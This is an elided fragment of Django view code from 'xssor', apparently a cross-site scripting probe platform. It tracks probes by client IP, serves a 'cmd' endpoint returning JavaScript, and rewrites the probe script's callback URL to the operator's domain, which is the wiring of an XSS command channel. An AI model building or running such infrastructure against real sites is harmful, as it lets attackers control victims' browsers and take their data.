...
from xssor.settings import DOMAIN

BASEDIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
PROBEDIR = os.path.join(os.path.dirname(
    os.path.dirname(os.path.abspath(__file__))), 'probe')
...
def probe_status(req):
    if not __reqisok(req):
        ...
        resp = HttpResponse(simplejson.dumps(
            rnt, ensure_ascii=False), content_type='application/json')
        return resp
    ip = req.META.get('REMOTE_ADDR', '')
    pid1 = __getpid(ip)
    ...
    if pid1 != pid2:
        rnt = {
            'succ': 0, 'msg': 'Probe status fetched failed. Probe string must be: %s' % pid1}
        resp = HttpResponse(simplejson.dumps(
            rnt, ensure_ascii=False), content_type='application/json')
        return resp
...
def cmd(req):
    if not __reqisok(req):
        resp = HttpResponse('alert("DO NOT BE BAD.");',
...
def probe_create(req):
    ...
    c = f.read()
    f.close()
    c = c.replace('abcdefg', pid1).replace(
        '//xssor.io/cmd', "//%s/cmd" % DOMAIN)
